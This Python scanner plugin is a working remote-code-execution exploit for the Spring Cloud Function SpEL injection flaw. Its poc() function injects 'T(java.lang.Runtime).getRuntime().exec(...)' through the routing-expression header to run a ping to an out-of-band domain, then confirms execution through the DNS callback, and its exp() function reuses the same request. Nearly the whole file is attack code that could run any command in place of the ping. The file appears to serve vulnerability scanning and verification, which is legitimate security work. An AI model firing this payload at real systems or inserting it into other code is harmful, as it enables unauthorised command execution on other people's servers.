import requests
from plugins.oob import gen_oob_domain, verify_request


# Vuln Base Info
def info():
    return {
        "author": "cckuailong",
        "name": '''Spring Cloud Function SpEL RCE''',
        "description": '''''',
        "severity": "critical",
        "references": [
            "https://github.com/cckuailong/spring-cloud-function-SpEL-RCE", 
            "https://hosch3n.github.io/2022/03/26/SpringCloudFunction%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/", 
            "https://github.com/spring-cloud/spring-cloud-function/commit/dc5128b80c6c04232a081458f637c81a64fa9b52", 
        ],
        "classification": {
            "cvss-metrics": "",
            "cvss-score": "",
            "cve-id": "",
            "cwe-id": ""
        },
        "metadata":{
            "vuln-target": "https://github.com/cckuailong/spring-cloud-function-SpEL-RCE"
        },
        "tags": ["springcloud", "rce", "spel"],
    }


# Vender Fingerprint
def fingerprint(url):
    return True

# Proof of Concept
def poc(url):
    result = {}
    oob_domain, flag = gen_oob_domain()
    try:
        url = format_url(url)

        path = """/xxx"""
        data = "xxx"
        headers = {
            'spring.cloud.function.routing-expression': 'T(java.lang.Runtime).getRuntime().exec("ping -c 1 {oob_domain}")'.format(oob_domain=oob_domain),
            'Content-Type': 'application/x-www-form-urlencoded'
        }
        resp = requests.post(url=url+path,data=data,headers=headers,timeout=10,verify=False,allow_redirects=False)

        if resp.status_code == 500 and verify_request("dns", flag):
            result["success"] = True
            result["info"] = info()
            result["payload"] = url+path

    except:
        result["success"] = False
    
    return result


# Exploit, can be same with poc()
def exp(url):
    return poc(url)


# Utils
def format_url(url):
    url = url.strip()
    if not ( url.startswith('http://') or url.startswith('https://') ):
        url = 'http://' + url
    url = url.rstrip('/')

    return url